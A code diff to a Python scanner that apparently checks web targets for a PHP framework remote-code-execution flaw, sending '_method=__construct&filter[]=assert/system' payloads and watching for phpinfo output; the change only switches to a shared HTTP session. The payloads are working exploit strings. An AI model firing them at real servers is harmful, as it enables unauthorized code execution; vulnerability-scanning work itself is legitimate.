@@ -66,8 +66,10 @@ def check(url):
     ]
 
     try:
+        s = requests.session()
+        s.keep_alive = False
         for payload in get_payloads:
-            r = requests.get(url + payload, headers=headers)
+            r = s.get(url + payload, headers=headers)
             if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                 items['Type'] = 'GET'
                 items['Request'] = make_request_package(r.request)
@@ -75,7 +77,7 @@ def check(url):
 
         for suffix in suffixs1:
             for payload in post_payloads1:
-                r = requests.post(url + suffix, data=payload, headers=headers)
+                r = s.post(url + suffix, data=payload, headers=headers)
                 if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                     items['Type'] = 'POST' 
                     items['Request'] = make_request_package(r.request)
@@ -83,7 +85,7 @@ def check(url):
                 
         for suffix in suffixs2:
             for payload in post_payloads2:
-                r = requests.post(url + suffix, data=payload, headers=headers)
+                r = s.post(url + suffix, data=payload, headers=headers)
                 if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
                     items['Type'] = 'POST' 
                     items['Request'] = make_request_package(r.request)
@@ -92,7 +94,7 @@ def check(url):
     
         suffix = r'?s=captcha&test=phpinfo()'
         payload = r'_method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=-1'
-        r = requests.post(url + suffix, data=payload, headers=headers)
+        r = s.post(url + suffix, data=payload, headers=headers)
         if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
             items['Type'] = 'POST' 
             items['Request'] = make_request_package(r.request)
@@ -100,7 +102,7 @@ def check(url):
 
         suffix = r'?s=captcha/phpinfo'
         payload = r'_method=__construct&filter[]=system&method=GET'
-        r = requests.post(url + suffix, data=payload, headers=headers)
+        r = s.post(url + suffix, data=payload, headers=headers)
         if ('PHP Version' in r.text) or ('PHP Extension Build' in r.text):
             items['Type'] = 'POST' 
             items['Request'] = make_request_package(r.request)
